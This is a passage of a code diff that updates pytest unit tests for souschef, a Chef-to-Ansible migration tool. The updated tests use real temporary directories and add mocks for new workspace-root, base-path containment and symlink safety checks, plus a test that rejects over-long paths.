@@ -12,6 +12,8 @@ import pytest
 
 from souschef.assessment import _analyse_cookbook_dependencies_detailed
 from souschef.server import (
+    _MAX_PATH_LENGTH,
+    _MAX_PLAN_PATHS,
     ValidationCategory,
     ValidationEngine,
     ValidationLevel,
@@ -104,47 +106,6 @@ from souschef.server import (
 FIXTURES_DIR = Path(__file__).parents[1] / "integration" / "fixtures"
 
 
-@contextlib.contextmanager
-def mock_inline_path_guards(exists_side_effect=None):
-    """
-    Context manager to mock the inline path guards used in assessment functions.
-
-    Args:
-        exists_side_effect: Optional side effect function for os.path.exists
-
-    """
-
-    def default_exists(path):
-        return "/recipes" in str(path) or "/attributes" in str(path)
-
-    def mock_realpath(path, strict=False):  # noqa: ARG001
-        if isinstance(path, Path):
-            return str(path)
-        return str(path) if path else "/mock/path"
-
-    def mock_commonpath(paths):
-        # Return the common prefix - should be the base path for valid paths
-        if not paths:
-            return "/mock/path"
-        str_paths = [str(p) for p in paths]
-        # For containment checks, the base should be the common prefix
-        return str_paths[0]  # Return first path as common
-
-    def mock_join(*args):
-        return "/".join(str(a) for a in args)
-
-    with (
-        patch("souschef.assessment.os.path.realpath", side_effect=mock_realpath),
-        patch("souschef.assessment.os.path.commonpath", side_effect=mock_commonpath),
-        patch(
-            "souschef.assessment.os.path.exists",
-            side_effect=exists_side_effect or default_exists,
-        ),
-        patch("souschef.assessment.os.path.join", side_effect=mock_join),
-    ):
-        yield
-
-
 def test_list_directory_success():
     """Test that list_directory returns a list of files."""
     mock_path = MagicMock(spec=Path)
@@ -154,47 +115,54 @@ def test_list_directory_success():
     mock_file2.name = "file2.txt"
     mock_path.iterdir.return_value = [mock_file1, mock_file2]
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = list_directory(".")
         assert result == ["file1.txt", "file2.txt"]
 
 
-def test_assess_chef_migration_complexity_success():
+def test_assess_chef_migration_complexity_success(tmp_path, monkeypatch):
     """Test assess_chef_migration_complexity with valid cookbook paths."""
     from souschef.server import assess_chef_migration_complexity
 
-    mock_cookbook_path = MagicMock(spec=Path)
-    mock_cookbook_path.exists.return_value = True
-    mock_cookbook_path.name = "test_cookbook"
-
-    mock_recipes_dir = MagicMock(spec=Path)
-    mock_recipes_dir.exists.return_value = True
-    mock_recipe_file = MagicMock(spec=Path)
-    mock_recipe_file.open.return_value.__enter__.return_value.read.return_value = """
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    cookbook_dir = tmp_path / "test_cookbook"
+    cookbook_dir.mkdir()
+    recipes_dir = cookbook_dir / "recipes"
+    recipes_dir.mkdir()
+    (recipes_dir / "default.rb").write_text(
+        """
 package "nginx" do
-  action :install
+    action :install
 end
 
 service "nginx" do
-  action [:enable, :start]
+    action [:enable, :start]
 end
 """
-    mock_recipes_dir.glob.return_value = [mock_recipe_file]
-    mock_cookbook_path.__truediv__.return_value = mock_recipes_dir
+    )
 
-    with patch("souschef.assessment._normalize_path") as mock_path_class:
-        mock_path_class.return_value = mock_cookbook_path
-        result = assess_chef_migration_complexity("/path/to/cookbook")
+    result = assess_chef_migration_complexity(str(cookbook_dir))
 
-        assert "Chef to Ansible Migration Assessment" in result
-        assert "Overall Migration Metrics" in result
-        assert "Migration Recommendations" in result
-        assert "Migration Roadmap" in result
+    assert "Chef to Ansible Migration Assessment" in result
+    assert "Overall Migration Metrics" in result
+    assert "Migration Recommendations" in result
+    assert "Migration Roadmap" in result
 
 
-def test_assess_chef_migration_complexity_cookbook_not_found():
+def test_assess_chef_migration_complexity_cookbook_not_found(monkeypatch):
+    """Test assess_chef_migration_complexity when cookbook doesn't exist."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test assess_chef_migration_complexity when cookbook doesn't exist."""
     from souschef.server import assess_chef_migration_complexity
 
@@ -209,32 +177,24 @@ def test_assess_chef_migration_complexity_cookbook_not_found():
         assert "Migration Assessment" in result
 
 
-def test_generate_migration_plan_success():
+def test_generate_migration_plan_success(tmp_path, monkeypatch):
     """Test generate_migration_plan with valid parameters."""
     from souschef.server import generate_migration_plan
 
-    mock_cookbook_path = MagicMock(spec=Path)
-    mock_cookbook_path.exists.return_value = True
-    mock_cookbook_path.name = "test_cookbook"
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    cookbook_dir = tmp_path / "test_cookbook"
+    cookbook_dir.mkdir()
+    recipes_dir = cookbook_dir / "recipes"
+    recipes_dir.mkdir()
+    (recipes_dir / "default.rb").write_text("package 'nginx'")
 
-    mock_recipes_dir = MagicMock(spec=Path)
-    mock_recipes_dir.exists.return_value = True
-    mock_recipe_file = MagicMock(spec=Path)
-    mock_recipe_file.open.return_value.__enter__.return_value.read.return_value = (
-        "package 'nginx'"
-    )
-    mock_recipes_dir.glob.return_value = [mock_recipe_file]
-    mock_cookbook_path.__truediv__.return_value = mock_recipes_dir
+    result = generate_migration_plan(str(cookbook_dir), "phased", 12)
 
-    with patch("souschef.assessment._normalize_path") as mock_path_class:
-        mock_path_class.return_value = mock_cookbook_path
-        result = generate_migration_plan("/path/to/cookbook", "phased", 12)
-
-        assert "Chef to Ansible Migration Plan" in result
-        assert "Strategy: phased" in result
-        assert "Timeline: 12 weeks" in result
-        assert "Migration Phases" in result
-        assert "Team Requirements" in result
+    assert "Chef to Ansible Migration Plan" in result
+    assert "Strategy: phased" in result
+    assert "Timeline: 12 weeks" in result
+    assert "Migration Phases" in result
+    assert "Team Requirements" in result
 
 
 def test_analyse_cookbook_dependencies_success():
@@ -401,76 +361,54 @@ def test_generate_migration_plan_parallel_strategy(tmp_path):
     assert "parallel" in result.lower() or "strategy" in result.lower()
 
 
-def test_generate_migration_report_success():
+def test_generate_migration_report_success(tmp_path, monkeypatch):
     """Test migration report generation with assessment results."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     from souschef.server import generate_migration_report
 
-    mock_cookbook = MagicMock(spec=Path)
-    mock_cookbook.exists.return_value = True
-    mock_cookbook.name = "test_cookbook"
+    cookbook_dir = tmp_path / "test_cookbook"
+    cookbook_dir.mkdir()
+    recipes_dir = cookbook_dir / "recipes"
+    recipes_dir.mkdir()
+    (recipes_dir / "default.rb").write_text("package 'nginx'")
 
-    mock_recipes_dir = MagicMock(spec=Path)
-    mock_recipes_dir.exists.return_value = True
-    mock_recipe = MagicMock(spec=Path)
-    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
-        "package 'nginx'"
+    result = generate_migration_report(
+        str(cookbook_dir),
+        "high_level",
+        "html",
     )
-    mock_recipes_dir.glob.return_value = [mock_recipe]
 
-    with (
-        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
-        mock_inline_path_guards(
-            exists_side_effect=lambda path: "/recipes" in str(path)
-        ),
-        patch("souschef.assessment.Path", return_value=mock_recipes_dir),
-    ):
-        result = generate_migration_report(
-            "/path/to/cookbook",
-            "high_level",
-            "html",
-        )
-
-        assert "Migration Report" in result
-        # Report is generated but format isn't explicitly mentioned
-        assert "Report Type:" in result or "high_level" in result.lower()
+    assert "Migration Report" in result
+    # Report is generated but format isn't explicitly mentioned
+    assert "Report Type:" in result or "high_level" in result.lower()
 
 
-def test_generate_migration_report_detailed_format():
+def test_generate_migration_report_detailed_format(tmp_path, monkeypatch):
     """Test migration report with detailed format."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     from souschef.server import generate_migration_report
 
-    mock_cookbook = MagicMock(spec=Path)
-    mock_cookbook.exists.return_value = True
-    mock_cookbook.name = "test_cookbook"
+    cookbook_dir = tmp_path / "test_cookbook"
+    cookbook_dir.mkdir()
+    recipes_dir = cookbook_dir / "recipes"
+    recipes_dir.mkdir()
+    (recipes_dir / "default.rb").write_text("package 'nginx'")
 
-    mock_recipes_dir = MagicMock(spec=Path)
-    mock_recipes_dir.exists.return_value = True
-    mock_recipe = MagicMock(spec=Path)
-    mock_recipe.open.return_value.__enter__.return_value.read.return_value = (
-        "package 'nginx'"
+    result = generate_migration_report(
+        str(cookbook_dir),
+        "detailed",
+        "markdown",
     )
-    mock_recipes_dir.glob.return_value = [mock_recipe]
 
-    with (
-        patch("souschef.assessment._normalize_path", return_value=mock_cookbook),
-        mock_inline_path_guards(
-            exists_side_effect=lambda path: "/recipes" in str(path)
-        ),
-        patch("souschef.assessment.Path", return_value=mock_recipes_dir),
-    ):
-        result = generate_migration_report(
-            "/path/to/cookbook",
-            "detailed",
-            "markdown",
-        )
-
-        assert "Migration Report" in result
-        assert "Report Type:" in result or "Detailed" in result
-        # Detailed reports include technical sections
-        assert "Risk Assessment" in result or "Recommendations" in result
+    assert "Migration Report" in result
+    assert "Report Type:" in result or "Detailed" in result
+    # Detailed reports include technical sections
+    assert "Risk Assessment" in result or "Recommendations" in result
 
 
-def test_analyse_cookbook_dependencies_not_found():
+def test_analyse_cookbook_dependencies_not_found(monkeypatch):
+    """Test analyse_cookbook_dependencies when cookbook doesn't exist."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test analyse_cookbook_dependencies when cookbook doesn't exist."""
     from souschef.server import analyse_cookbook_dependencies
 
@@ -592,13 +530,23 @@ package "nginx"
         assert "Detected Patterns" in result
 
 
-def test_list_directory_empty():
+def test_list_directory_empty(monkeypatch):
     """Test that list_directory returns an empty list for empty directories."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.return_value = []
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = list_directory("/empty")
         assert result == []
@@ -609,8 +557,17 @@ def test_list_directory_not_found():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = FileNotFoundError
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = list_directory("non_existent_directory")
         assert "Error: Directory not found" in result
@@ -621,8 +578,17 @@ def test_list_directory_not_a_directory():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = NotADirectoryError
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = list_directory("file.txt")
         assert "Error:" in result
@@ -634,8 +600,17 @@ def test_list_directory_permission_denied():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = PermissionError
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = list_directory("/root")
         assert "Error: Permission denied" in result
@@ -646,8 +621,17 @@ def test_list_directory_other_exception():
     mock_path = MagicMock(spec=Path)
     mock_path.iterdir.side_effect = Exception("A test exception")
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = list_directory(".")
         assert "An error occurred: A test exception" in result
@@ -658,8 +642,17 @@ def test_read_file_success():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.return_value = "file contents here"
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = read_file("test.txt")
         assert result == "file contents here"
@@ -671,8 +664,17 @@ def test_read_file_not_found():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = FileNotFoundError
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = read_file("missing.txt")
         assert "Error: File not found" in result
@@ -683,8 +685,17 @@ def test_read_file_is_directory():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = IsADirectoryError
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = read_file("somedir")
         assert "Error:" in result
@@ -696,8 +707,17 @@ def test_read_file_permission_denied():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = PermissionError
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = read_file("protected.txt")
         assert "Error: Permission denied" in result
@@ -708,8 +728,17 @@ def test_read_file_unicode_decode_error():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = UnicodeDecodeError("utf-8", b"", 0, 1, "invalid")
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = read_file("binary.dat")
         assert "Error:" in result and "codec can't decode" in result
@@ -720,15 +749,25 @@ def test_read_file_other_exception():
     mock_path = MagicMock(spec=Path)
     mock_path.read_text.side_effect = Exception("Unexpected error")
 
-    with patch(
-        "souschef.filesystem.operations._normalize_path", return_value=mock_path
+    with (
+        patch("souschef.filesystem.operations._normalize_path", return_value=mock_path),
+        patch(
+            "souschef.filesystem.operations._get_workspace_root",
+            return_value=Path("/workspaces/souschef"),
+        ),
+        patch(
+            "souschef.filesystem.operations._ensure_within_base_path",
+            return_value=mock_path,
+        ),
+        patch("souschef.filesystem.operations._check_symlink_safety"),
     ):
         result = read_file("test.txt")
         assert "An error occurred: Unexpected error" in result
 
 
-def test_read_cookbook_metadata_success():
+def test_read_cookbook_metadata_success(monkeypatch):
     """Test read_cookbook_metadata with valid metadata.rb."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     metadata_content = """
 name 'apache2'
 maintainer 'Chef Software, Inc.'
@@ -740,7 +779,11 @@ depends 'iptables'
 supports 'ubuntu'
 supports 'debian'
     """
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+        patch("souschef.parsers.metadata.safe_read_text") as mock_read,
+    ):
         mock_read.return_value = metadata_content
 
         result = read_cookbook_metadata("/cookbook/metadata.rb")
@@ -754,10 +797,16 @@ supports 'debian'
         assert "supports: ubuntu, debian" in result
 
 
-def test_read_cookbook_metadata_minimal():
+def test_read_cookbook_metadata_minimal(monkeypatch):
+    """Test read_cookbook_metadata with minimal metadata."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     """Test read_cookbook_metadata with minimal metadata."""
     metadata_content = "name 'simple'"
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+        patch("souschef.parsers.metadata.safe_read_text") as mock_read,
+    ):
         mock_read.return_value = metadata_content
 
         result = read_cookbook_metadata("/cookbook/metadata.rb")
@@ -766,9 +815,15 @@ def test_read_cookbook_metadata_minimal():
         assert "depends" not in result
 
 
-def test_read_cookbook_metadata_empty():
+def test_read_cookbook_metadata_empty(monkeypatch):
     """Test read_cookbook_metadata with empty file."""
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test read_cookbook_metadata with empty file."""
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+        patch("souschef.parsers.metadata.safe_read_text") as mock_read,
+    ):
         mock_read.return_value = ""
 
         result = read_cookbook_metadata("/cookbook/metadata.rb")
@@ -776,21 +831,30 @@ def test_read_cookbook_metadata_empty():
         assert "Warning: No metadata found" in result
 
 
-def test_read_cookbook_metadata_not_found():
+def test_read_cookbook_metadata_not_found(monkeypatch):
     """Test read_cookbook_metadata with non-existent file."""
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
-        mock_read.side_effect = FileNotFoundError()
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test read_cookbook_metadata with non-existent file."""
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=False),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+    ):
         result = read_cookbook_metadata("/nonexistent/metadata.rb")
 
         assert "Error: File not found" in result
 
 
-def test_read_cookbook_metadata_is_directory():
+def test_read_cookbook_metadata_is_directory(monkeypatch):
     """Test read_cookbook_metadata when path is a directory."""
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
-        mock_read.side_effect = IsADirectoryError()
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=True),
+        patch(
+            "souschef.parsers.metadata.safe_read_text",
+            side_effect=IsADirectoryError(),
+        ),
+    ):
         result = read_cookbook_metadata("/some/directory")
 
         assert "Error:" in result
@@ -799,7 +863,11 @@ def test_read_cookbook_metadata_is_directory():
 
 def test_read_cookbook_metadata_permission_denied():
     """Test read_cookbook_metadata with permission error."""
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+        patch("souschef.parsers.metadata.safe_read_text") as mock_read,
+    ):
         mock_read.side_effect = PermissionError()
 
         result = read_cookbook_metadata("/forbidden/metadata.rb")
@@ -809,7 +877,11 @@ def test_read_cookbook_metadata_permission_denied():
 
 def test_read_cookbook_metadata_unicode_error():
     """Test read_cookbook_metadata with unicode decode error."""
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+        patch("souschef.parsers.metadata.safe_read_text") as mock_read,
+    ):
         mock_read.side_effect = UnicodeDecodeError("utf-8", b"", 0, 1, "invalid")
 
         result = read_cookbook_metadata("/binary/file")
@@ -817,9 +889,15 @@ def test_read_cookbook_metadata_unicode_error():
         assert "Error:" in result and "codec can't decode" in result
 
 
-def test_read_cookbook_metadata_other_exception():
+def test_read_cookbook_metadata_other_exception(monkeypatch):
     """Test read_cookbook_metadata with unexpected exception."""
-    with patch("souschef.parsers.metadata.safe_read_text") as mock_read:
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test read_cookbook_metadata with unexpected exception."""
+    with (
+        patch("souschef.parsers.metadata.safe_exists", return_value=True),
+        patch("souschef.parsers.metadata.safe_is_dir", return_value=False),
+        patch("souschef.parsers.metadata.safe_read_text") as mock_read,
+    ):
         mock_read.side_effect = Exception("Unexpected")
 
         result = read_cookbook_metadata("/some/path/metadata.rb")
@@ -844,11 +922,15 @@ template '/etc/nginx/nginx.conf' do
   action :create
 end
     """
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = recipe_content
-
+    safe_path = Path("/cookbook/recipes/default.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.recipe.safe_read_text", return_value=recipe_content),
+    ):
         result = parse_recipe("/cookbook/recipes/default.rb")
 
         assert "Resource 1:" in result
@@ -861,37 +943,70 @@ end
         assert "Type: template" in result
 
 
-def test_parse_recipe_empty():
+def test_parse_recipe_empty(monkeypatch):
     """Test parse_recipe with no resources."""
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = "# Just comments"
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_recipe with no resources."""
+    safe_path = Path("/cookbook/recipes/empty.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.recipe.safe_read_text", return_value="# Just comments"),
+    ):
         result = parse_recipe("/cookbook/recipes/empty.rb")
 
         assert "Warning: No Chef resources or include_recipe calls found" in result
 
 
-def test_parse_recipe_not_found():
-    """Test parse_recipe with non-existent file."""
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = FileNotFoundError()
+def test_parse_recipe_rejects_long_path():
+    """Test parse_recipe rejects excessively long paths."""
+    long_path = "a" * (_MAX_PATH_LENGTH + 1)
 
+    result = parse_recipe(long_path)
+
+    assert "exceeds maximum length" in result
+
+
+def test_parse_recipe_not_found(monkeypatch):
+    """Test parse_recipe with non-existent file."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_recipe with non-existent file."""
+    safe_path = Path("/nonexistent/recipe.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch(
+            "souschef.parsers.recipe.safe_read_text",
+            side_effect=FileNotFoundError(),
+        ),
+    ):
         result = parse_recipe("/nonexistent/recipe.rb")
 
         assert "Error: File not found" in result
 
 
-def test_parse_recipe_is_directory():
+def test_parse_recipe_is_directory(monkeypatch):
     """Test parse_recipe when path is a directory."""
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = IsADirectoryError()
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_recipe when path is a directory."""
+    safe_path = Path("/some/directory")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch(
+            "souschef.parsers.recipe.safe_read_text",
+            side_effect=IsADirectoryError(),
+        ),
+    ):
         result = parse_recipe("/some/directory")
 
         assert "Error:" in result
@@ -900,11 +1015,18 @@ def test_parse_recipe_is_directory():
 
 def test_parse_recipe_permission_denied():
     """Test parse_recipe with permission error."""
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = PermissionError()
-
+    safe_path = Path("/forbidden/recipe.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch(
+            "souschef.parsers.recipe.safe_read_text",
+            side_effect=PermissionError(),
+        ),
+    ):
         result = parse_recipe("/forbidden/recipe.rb")
 
         assert "Error: Permission denied" in result
@@ -912,43 +1034,67 @@ def test_parse_recipe_permission_denied():
 
 def test_parse_recipe_unicode_error():
     """Test parse_recipe with unicode decode error."""
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = UnicodeDecodeError(
-            "utf-8", b"", 0, 1, "invalid"
-        )
-
+    safe_path = Path("/binary/file.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch(
+            "souschef.parsers.recipe.safe_read_text",
+            side_effect=UnicodeDecodeError("utf-8", b"", 0, 1, "invalid"),
+        ),
+    ):
         result = parse_recipe("/binary/file.rb")
 
         assert "Error:" in result and "codec can't decode" in result
 
 
-def test_parse_recipe_other_exception():
+def test_parse_recipe_other_exception(monkeypatch):
     """Test parse_recipe with unexpected exception."""
-    with patch("souschef.parsers.recipe._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.side_effect = Exception("Unexpected")
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_recipe with unexpected exception."""
+    safe_path = Path("/some/path/recipe.rb")
+    with (
+        patch("souschef.parsers.recipe._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.recipe._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch(
+            "souschef.parsers.recipe.safe_read_text",
+            side_effect=Exception("Unexpected"),
+        ),
+    ):
         result = parse_recipe("/some/path/recipe.rb")
 
         assert "An error occurred: Unexpected" in result
 
 
-def test_parse_attributes_success():
+def test_parse_attributes_success(monkeypatch):
     """Test parse_attributes with valid attributes file."""
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
     attributes_content = """
 default['nginx']['port'] = 80
 default['nginx']['ssl_port'] = 443
 override['nginx']['worker_processes'] = 4
 default['nginx']['user'] = 'www-data'
     """
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = attributes_content
-
+    safe_path = Path("/cookbook/attributes/default.rb")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
+        patch("souschef.parsers.attributes.safe_exists", return_value=True),
+        patch("souschef.parsers.attributes.safe_is_dir", return_value=False),
+        patch(
+            "souschef.parsers.attributes.safe_read_text",
+            return_value=attributes_content,
+        ),
+    ):
         result = parse_attributes("/cookbook/attributes/default.rb")
 
         # By default, resolved format is returned
@@ -960,37 +1106,65 @@ default['nginx']['user'] = 'www-data'
         assert "www-data" in result
 
 
-def test_parse_attributes_empty():
+def test_parse_attributes_empty(monkeypatch):
     """Test parse_attributes with no attributes."""
-    with patch("souschef.parsers.attributes._normalize_path") as mock_path:
-        mock_instance = MagicMock()
-        mock_path.return_value = mock_instance
-        mock_instance.read_text.return_value = "# Just comments"
-
+    monkeypatch.setenv("SOUSCHEF_WORKSPACE_ROOT", "/")
+    """Test parse_attributes with no attributes."""
+    safe_path = Path("/cookbook/attributes/empty.rb")
+    with (
+        patch("souschef.parsers.attributes._normalize_path", return_value=safe_path),
+        patch(
+            "souschef.parsers.attributes._ensure_within_base_path",
+            return_value=safe_path,
+        ),
